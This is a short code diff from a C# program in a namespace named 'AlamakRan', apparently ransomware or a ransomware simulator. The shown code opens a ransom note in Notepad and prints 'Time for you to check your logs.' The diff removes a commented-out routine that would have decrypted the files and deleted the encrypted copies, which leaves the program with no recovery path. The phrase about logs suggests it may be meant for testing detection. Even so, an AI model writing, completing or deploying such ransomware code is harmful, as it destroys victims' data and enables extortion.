@@ -200,13 +200,7 @@ namespace AlamakRan
             Process.Start("notepad.exe", ransomNote);
 
             Console.WriteLine("Time for you to check your logs.");
-            //--------------------------------------------------------------------------------------------------------------
-            //Console.WriteLine("Starting decryption process");
-            //foreach (string file in files)
-            //{
-            //    FileDecrypt(file, targetDirPath+"\\Decrypted.txt", randomPassword);
-            //    File.Delete(file);
-            //}
+
         }
     }
 }
